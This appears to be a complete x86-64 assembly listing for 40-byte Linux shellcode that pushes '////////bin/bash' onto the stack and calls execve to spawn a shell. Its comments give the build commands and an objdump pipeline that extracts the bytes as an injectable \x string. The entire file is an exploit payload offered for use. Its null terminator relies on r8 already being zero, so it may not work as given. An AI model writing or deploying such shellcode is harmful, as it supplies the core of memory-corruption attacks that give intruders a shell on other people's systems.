; execve x64 /bin/bash - 40 bytes   by 0bfxgh0st*
;
; nasm -f elf64 execve_x64_bash.asm
; ld -o execve_x64_bash execve_x64_bash.o -m elf_x86_64
; objdump -d execve_x64_bash |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
section .text

global _start

_start:

xor rdx,rdx

push r8
mov r8, 0x687361622f6e6962
push r8
mov r8, 0x2f2f2f2f2f2f2f2f
push r8

mov rdi, rsp

push rdx

mov rsi, rsp

mov al, 59
syscall
